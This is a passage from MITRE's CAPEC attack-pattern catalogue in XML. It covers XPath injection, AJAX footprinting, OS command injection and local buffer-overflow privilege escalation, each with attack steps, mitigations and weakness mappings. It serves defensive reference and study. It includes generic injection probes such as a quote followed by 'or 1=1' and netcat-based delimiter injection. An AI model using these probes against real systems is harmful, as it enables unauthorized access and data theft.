            <ns0:Related_Weakness CWE_ID="150" />
            <ns0:Related_Weakness CWE_ID="276" />
            <ns0:Related_Weakness CWE_ID="279" />
            <ns0:Related_Weakness CWE_ID="116" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2022-09-29">Web Logs Tampering</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="83" Name="XPath Injection" Abstraction="Detailed" Status="Draft">
         <ns0:Description>An attacker can craft special user-controllable input consisting of XPath expressions to inject the XML database and bypass authentication or glean information that they normally would not be able to. XPath Injection enables an attacker to talk directly to the XML database, thus bypassing the application completely. XPath Injection results from the failure of an application to properly sanitize input used as part of dynamic XPath expressions used to query an XML database.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="250" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey the target] Using a browser or an automated tool, an adversary records all instances of user-controllable input used to contruct XPath queries.</ns0:Description>
               <ns0:Technique>Use an automated tool to record all instances of user-controllable input used to contruct XPath queries.</ns0:Technique>
               <ns0:Technique>Use a browser to manually explore the website and analyze how the application processes inputs.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Determine the tructure of queries] Using manual or automated means, test inputs found for XPath weaknesses.</ns0:Description>
               <ns0:Technique>Use an automated tool automatically probe the inputs for XPath weaknesses.</ns0:Technique>
               <ns0:Technique>Manually probe the inputs using characters such as single quote (') that can cause XPath-releated errors, thus indicating an XPath weakness.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Inject content into XPath query] Craft malicious content containing XPath expressions that is not validated by the application and is executed as part of the XPath queries.</ns0:Description>
               <ns0:Technique>Use the crafted input to execute unexpected queries that can disclose sensitive database information to the attacker.</ns0:Technique>
               <ns0:Technique>Use a combination of single quote (') and boolean expressions such as "or 1=1" to manipulate XPath logic.</ns0:Technique>
               <ns0:Technique>Use XPath functions in the malicious content such as "string-length", "substring", or "count" to gain information about the XML document structure being used.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>XPath queries used to retrieve information stored in XML documents</ns0:Prerequisite>
            <ns0:Prerequisite>User-controllable input not properly sanitized before being used as part of XPath queries</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">XPath Injection shares the same basic premises with SQL Injection. An attacker must have knowledge of XPath syntax and constructs in order to successfully leverage XPath Injection</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>None: No specialized resources are required to execute this type of attack.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Indicators>
            <ns0:Indicator>Too many exceptions generated by the application as a result of malformed XPath queries</ns0:Indicator>
         </ns0:Indicators>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as content that can be interpreted in the context of an XPath expression. Characters such as a single-quote(') or operators such as or (|), and (&amp;) and such should be filtered if the application does not expect them in the context in which they appear. If such content cannot be filtered, it must at least be properly escaped to avoid them being interpreted as part of XPath expressions.</ns0:Mitigation>
            <ns0:Mitigation>Use of parameterized XPath queries - Parameterization causes the input to be restricted to certain domains, such as strings or integers, and any input outside such domains is considered invalid and the query fails.</ns0:Mitigation>
            <ns0:Mitigation>Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>Consider an application that uses an XML database to authenticate its users. The application retrieves the user name and password from a request and forms an XPath expression to query the database. An attacker can successfully bypass authentication and login without valid credentials through XPath Injection. This can be achieved by injecting the query to the XML database with XPath syntax that causes the authentication check to fail. Improper validation of user-controllable input and use of a non-parameterized XPath expression enable the attacker to inject an XPath expression that causes authentication bypass.</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="91" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="707" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>39</ns0:Entry_ID>
               <ns0:Entry_Name>XPath Injection</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="OWASP Attacks">
               <ns0:Entry_Name>Blind XPath Injection</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="OWASP Attacks">
               <ns0:Entry_Name>XPATH Injection</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-611" Section="Testing for XPATH Injection" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Phases, Description Summary, Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References, Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="85" Name="AJAX Footprinting" Abstraction="Detailed" Status="Draft">
         <ns0:Description>This attack utilizes the frequent client-server roundtrips in Ajax conversation to scan a system. While Ajax does not open up new vulnerabilities per se, it does optimize them from an attacker point of view. A common first step for an attacker is to footprint the target environment to understand what attacks will work. Since footprinting relies on enumeration, the conversational pattern of rapid, multiple requests and responses that are typical in Ajax applications enable an attacker to look for many vulnerabilities, well-known ports, network locations and so on. The knowledge gained through Ajax fingerprinting can be used to support other attacks, such as XSS.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Low</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="580" />
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="63" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Send request to target webpage and analyze HTML] Using a browser or an automated tool, an adversary sends requests to a webpage and records the received HTML response. Adversaries then analyze the HTML to identify any known underlying JavaScript architectures. This can aid in mappiong publicly known vulnerabilities to the webpage and can also helpo the adversary guess application architecture and the inner workings of a system.</ns0:Description>
               <ns0:Technique>Record all "src" values inside script tags. These JavaScript files are compared to lists of files for known architectures. If there is a large match between the "src" values and architecture files, then it can be assumed that particular architecture is being used.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The user must allow JavaScript to execute in their browser</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Medium">To land and launch a script on victim's machine with appropriate footprinting logic for enumerating services and vulnerabilities in JavaScript</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>None: No specialized resources are required to execute this type of attack.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Design: Use browser technologies that do not allow client side scripting.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Perform input validation for all remote content.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>Footprinting can be executed over almost any protocol including HTTP, TCP, UDP, and ICMP, with the general goal of gaining further information about a host environment to launch further attacks. The attacker can probe the system for banners, vulnerabilities, filenames, available services, and in short anything the host process has access to. The results of the probe are either used to execute javascript (for example, if the attackers' footprint script identifies a vulnerability in a firewall permission, then the client side script executes a javascript to change client firewall settings, or an attacker may simply echo the results of the scan back out to a remote host for targeting future attacks) or to inform other data gathering activities in order to craft atta.</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="79" />
            <ns0:Related_Weakness CWE_ID="113" />
            <ns0:Related_Weakness CWE_ID="348" />
            <ns0:Related_Weakness CWE_ID="96" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="116" />
            <ns0:Related_Weakness CWE_ID="184" />
            <ns0:Related_Weakness CWE_ID="86" />
            <ns0:Related_Weakness CWE_ID="692" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-539" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Example_Instances, Execution_Flow, Mitigations, Related_Attack_Patterns, Resources_Required, Typical_Severity</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">AJAX Fingerprinting</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="88" Name="OS Command Injection" Abstraction="Standard" Status="Draft">
         <ns0:Description>In this type of an attack, an adversary injects operating system commands into existing application functions. An application that uses untrusted input to build command strings is vulnerable. An adversary can leverage OS command injection in an application to elevate privileges, execute arbitrary commands and compromise the underlying operating system.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="248" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Identify inputs for OS commands] The attacker determines user controllable input that gets passed as part of a command to the underlying operating system.</ns0:Description>
               <ns0:Technique>Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.</ns0:Technique>
               <ns0:Technique>TCP/IP Fingerprinting. The attacker uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, they attempt to guess the actual operating system.</ns0:Technique>
               <ns0:Technique>Induce errors to find informative error messages</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey the Application] The attacker surveys the target application, possibly as a valid and authenticated user</ns0:Description>
               <ns0:Technique>Spidering web sites for all available links</ns0:Technique>
               <ns0:Technique>Inventory all application inputs</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Vary inputs, looking for malicious results.] Depending on whether the application being exploited is a remote or local one the attacker crafts the appropriate malicious input, containing OS commands, to be passed to the application</ns0:Description>
               <ns0:Technique>Inject command delimiters using network packet injection tools (netcat, nemesis, etc.)</ns0:Technique>
               <ns0:Technique>Inject command delimiters using web test frameworks (proxies, TamperData, custom programs, etc.)</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>4</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Execute malicious commands] The attacker may steal information, install a back door access mechanism, elevate privileges or compromise the system in some other way.</ns0:Description>
               <ns0:Technique>The attacker executes a command that stores sensitive information into a location where they can retrieve it later (perhaps using a different command injection).</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>User controllable input used as part of commands to the underlying operating system.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="High">The attacker needs to have knowledge of not only the application to exploit but also the exact nature of commands that pertain to the target operating system. This may involve, though not always, knowledge of specific assembly commands for the platform.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
               <ns0:Impact>Bypass Protection Mechanism</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Use language APIs rather than relying on passing data to the operating system shell or command line. Doing so ensures that the available protection mechanisms in the language are intact and applicable.</ns0:Mitigation>
            <ns0:Mitigation>Filter all incoming data to escape or remove characters or strings that can be potentially misinterpreted as operating system or shell commands</ns0:Mitigation>
            <ns0:Mitigation>All application processes should be run with the minimal privileges required. Also, processes must shed privileges as soon as they no longer require them.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>A transaction processing system relies on code written in a number of languages. To access this functionality, the system passes transaction information on the system command line.</html:p>
               <html:p>An attacker can gain access to the system command line and execute malicious commands by injecting these commands in the transaction data. If successful, the attacker can steal information, install backdoors and perform other nefarious activities that can compromise the system and its data.</html:p>See also: A vulnerability in Mozilla Firefox 1.x browser allows an attacker to execute arbitrary commands on the UNIX/Linux operating system. The vulnerability is caused due to the shell script used to launch Firefox parsing shell commands that are enclosed within back-ticks in the URL provided via the command line. This can be exploited to execute arbitrary shell commands by tricking a user into following a malicious link in an external application which uses Firefox as the default browser (e.g. the mail client Evolution on Red Hat Enterprise Linux 4).</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="78" />
            <ns0:Related_Weakness CWE_ID="88" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="697" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>31</ns0:Entry_ID>
               <ns0:Entry_Name>OS Commanding</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-543" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow, Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="9" Name="Buffer Overflow in Local Command-Line Utilities" Abstraction="Detailed" Status="Draft">
         <ns0:Description>This attack targets command-line utilities available in a number of shells. An adversary can leverage a vulnerability found in a command-line utility to escalate privilege to root.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="100" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Identify target system] The adversary first finds a target system that they want to gain elevated priveleges on. This could be a system they already have some level of access to or a system that they will gain unauthorized access at a lower privelege using some other means.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Find injection vector] The adversary identifies command line utilities exposed by the target host that contain buffer overflow vulnerabilites. The adversary likely knows which utilities have these vulnerabilities and what the effected versions are, so they will also obtain version numbers for these utilities.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Craft overflow command] Once the adversary has found a vulnerable utility, they will use their knownledge of the vulnerabilty to create the command that will exploit the buffer overflow.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>4</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Overflow the buffer] Using the injection vector, the adversary executes the crafted command, gaining elevated priveleges on the machine.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The target host exposes a command-line utility to the user.</ns0:Prerequisite>
            <ns0:Prerequisite>The command-line utility exposed by the target host has a buffer overflow vulnerability that can be exploited.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">An adversary can simply overflow a buffer by inserting a long string into an adversary-modifiable injection vector. The result can be a DoS.</ns0:Skill>
            <ns0:Skill Level="High">Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Unreliable Execution</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Carefully review the service's implementation before making it available to user. For instance you can use manual or automated code review to uncover vulnerabilities such as buffer overflow.</ns0:Mitigation>
            <ns0:Mitigation>Use a language or compiler that performs automatic bounds checking.</ns0:Mitigation>
            <ns0:Mitigation>Use an abstraction library to abstract away risky APIs. Not a complete solution.</ns0:Mitigation>
            <ns0:Mitigation>Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.</ns0:Mitigation>
            <ns0:Mitigation>Operational: Use OS-level preventative functionality. Not a complete solution.</ns0:Mitigation>
            <ns0:Mitigation>Apply the latest patches to your user exposed services. This may not be a complete solution, especially against a zero day attack.</ns0:Mitigation>
            <ns0:Mitigation>Do not unnecessarily expose services.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:div style="margin-left:1em;">
                  <html:b>Attack Example: HPUX passwd</html:b>
                  <html:div>A buffer overflow in the HPUX passwd command allows local users to gain root privileges via a command-line option.</html:div>
               </html:div>
               <html:div style="margin-left:1em;">
                  <html:b>Attack Example: Solaris getopt</html:b>
                  <html:div>A buffer overflow in Solaris's getopt command (found in libc) allows local users to gain root privileges via a long argv[0].</html:div>
               </html:div>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="120" />
            <ns0:Related_Weakness CWE_ID="118" />
            <ns0:Related_Weakness CWE_ID="119" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="680" />
            <ns0:Related_Weakness CWE_ID="733" />
            <ns0:Related_Weakness CWE_ID="697" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-10-21</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Skills_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
